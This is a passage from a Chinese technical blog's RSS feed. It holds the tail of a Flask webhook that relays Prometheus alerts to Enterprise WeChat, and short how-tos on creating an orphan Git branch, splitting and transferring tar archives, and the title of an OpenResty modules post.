<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        params[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'content'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> message.replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"告警恢复"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "&lt;font color='info'&gt;告警恢复&lt;/font&gt;"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    response</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> requests.post</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enterprise_wechat_webhook,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> headers=headers,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> params=params,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data=json.dumps</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> response.json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">def</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> read_user_names</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">filepath</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    user_names</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">filepath,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'r'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">as</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        for</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> line</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            ip,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> line.strip</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.split</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">' '</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 按空格分隔，只分割一次</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            user_names[ip]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> name</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user_names</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">user_names_data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> read_user_names</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'/data/network-prometheus/user.name.txt'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">@app.route(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'/webhook'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> methods=['POST']</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">def</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> webhook</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> request.json</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"Received data:"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    for</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> alert</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'alerts'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [])</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        event_status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alert.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'status'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        user_ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alert.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'labels'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'ip_address'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        current_value</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alert.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'annotations'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'summary'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"%"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 去除百分号</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        trigger_time</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alert.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'startsAt'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        end_time</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alert.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'endsAt'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        if</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> event_status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "firing":</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            event_status_text</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "&lt;font color='warning'&gt;事件告警&lt;/font&gt;"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            color</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "red"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        elif</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> event_status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "resolved":</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            event_status_text</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "&lt;font color='info'&gt;告警恢复&lt;/font&gt;"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            color</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "green"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        else:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            event_status_text</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> event_status</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            color</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "info"</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        event_name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> alert.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'labels'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'alertname'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 获取警报名称</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        if</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> user_ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user_names_data:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user_names_data[user_ip]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            message</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> f"### 事件状态: {event_status_text}\n\n事件名称: {event_name}\n用户IP: {user_ip}\n当前数值: {current_value}\n使用人: {name}\n触发时间: {trigger_time}\n结束时间: {end_time}"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        else:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">            message</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> f"### 事件状态: {event_status_text}\n\n事件名称: {event_name}\n用户IP: {user_ip}\n当前数值: {current_value}\n触发时间: {trigger_time}\n结束时间: {end_time}"</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        response</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> send_message_to_enterprise_wechat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">message,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> color=color</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jsonify</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> __name__</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__':</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    app.run(host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"0.0.0.0"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8081</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Git创建一个空分支</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%A9%BA%E5%88%86%E6%94%AF.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%A9%BA%E5%88%86%E6%94%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git创建一个空分支</source>
      <description>Git创建一个空分支 创建新分支 打开你的命令行界面（比如终端或Git Bash），进入你的Git仓库所在的目录。 在这个命令中，&amp;lt;branch-name&amp;gt; 是你想要创建的新分支的名称。 清空工作区 在新分支上，你可能希望清空所有文件，以确保它是一个空的分支。 这会删除当前分支下的所有文件。 提交更改 提交清空工作区后的更改。 现在，你就创建了一个无根...</description>
      <pubDate>Thu, 27 Jun 2024 02:56:52 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>创建新分支</h2>
<p>打开你的命令行界面（比如终端或Git Bash），进入你的Git仓库所在的目录。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> checkout</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --orphan</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">branch-nam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在这个命令中，<code>&lt;branch-name&gt;</code> 是你想要创建的新分支的名称。</p>
<h2>清空工作区</h2>
<p>在新分支上，你可能希望清空所有文件，以确保它是一个空的分支。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这会删除当前分支下的所有文件。</p>
<h2>提交更改</h2>
<p>提交清空工作区后的更改。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> commit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Initial commit"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>现在，你就创建了一个无根的空的新分支，可以在这个分支上开始新的工作了。</p>
]]></content:encoded>
    </item>
    <item>
      <title>使用tar命令进行分段压缩</title>
      <link>https://www.geekery.cn/note-book/LinuxOperaSystem/%E4%BD%BF%E7%94%A8tar%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%88%86%E6%AE%B5%E5%8E%8B%E7%BC%A9.html</link>
      <guid>https://www.geekery.cn/note-book/LinuxOperaSystem/%E4%BD%BF%E7%94%A8tar%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%88%86%E6%AE%B5%E5%8E%8B%E7%BC%A9.html</guid>
      <source url="https://www.geekery.cn/rss.xml">使用tar命令进行分段压缩</source>
      <description>使用tar命令进行分段压缩 很多时候，我们在进行大量小文件传输的时候，速度非常不理想。于是找到了分段压缩在传输的方法。 在 CentOS 7 上，你可以使用 tar 命令来对文件进行分段压缩、解压缩 步骤 1：压缩文件并分段 假设要压缩名为 largefile 的文件夹，并将其分割成每个 1GB 的小文件。 这条命令做了以下几件事情： tar -cv ...</description>
      <pubDate>Tue, 25 Jun 2024 10:00:59 GMT</pubDate>
      <content:encoded><![CDATA[
<p>很多时候，我们在进行大量小文件传输的时候，速度非常不理想。于是找到了分段压缩在传输的方法。</p>
<p>在 CentOS 7 上，你可以使用 tar 命令来对文件进行分段压缩、解压缩</p>
<h2>步骤 1：压缩文件并分段</h2>
<p>假设要压缩名为 largefile 的文件夹，并将其分割成每个 1GB 的小文件。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tar</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -cv</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> largefile/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">split</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> largefile.tar.gz.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这条命令做了以下几件事情：</p>
<ul>
<li><code>tar -cv largefile/</code>：将 largefile 文件夹打包成一个 tar 文件，并将过程显示在终端中。</li>
<li><code>split -b 1G - largefile.tar.gz.</code>：通过管道将 tar 文件传送给 split 命令，使用 <code>-b 1G</code> 参数将数据按照 1GB 的大小进行分割，并以 <code>largefile.tar.gz.</code> 为前缀生成分段文件。</li>
</ul>
<h2>步骤 2：传输分段压缩文件</h2>
<p>使用 scp 命令将分割后的文件传输到目标机器：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">scp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> largefile.tar.gz.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user@remote:/path/to/destination/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>传输所有以 <code>largefile.tar.gz.</code> 开头的分段文件到目标机器的指定路径。</p>
<h2>步骤 3：在目标机器上合并并解压</h2>
<p>在目标机器上，将分段文件合并并解压：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> largefile.tar.gz.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tar</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -xzvf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li><code>cat largefile.tar.gz.*</code>：将所有以 <code>largefile.tar.gz.</code> 开头的分段文件内容输出到 STDOUT。</li>
<li><code>tar -xzvf -</code>：通过管道将 STDOUT 的内容传送给 tar 命令进行解压缩。</li>
<li><code>-xzvf</code> 参数用于解压缩并显示过程中的详细信息。</li>
</ul>
<p>通过这些步骤，可以在 CentOS 7 上使用 tar 命令将大文件分段压缩、传输和解压缩，实现文件的高效传输和处理。</p>
]]></content:encoded>
    </item>
    <item>
      <title>OpenResty的所有模块</title>
      <link>https://www.geekery.cn/note-book/Nginx-OpenResty/OpenResty%E7%9A%84%E6%89%80%E6%9C%89%E6%A8%A1%E5%9D%97.html</link>
      <guid>https://www.geekery.cn/note-book/Nginx-OpenResty/OpenResty%E7%9A%84%E6%89%80%E6%9C%89%E6%A8%A1%E5%9D%97.html</guid>
      <source url="https://www.geekery.cn/rss.xml">OpenResty的所有模块</source>
      <description>OpenResty的所有模块 OpenResty版本1.25</description>
      <pubDate>Sun, 23 Jun 2024 11:06:18 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>OpenResty版本1.25</h2>
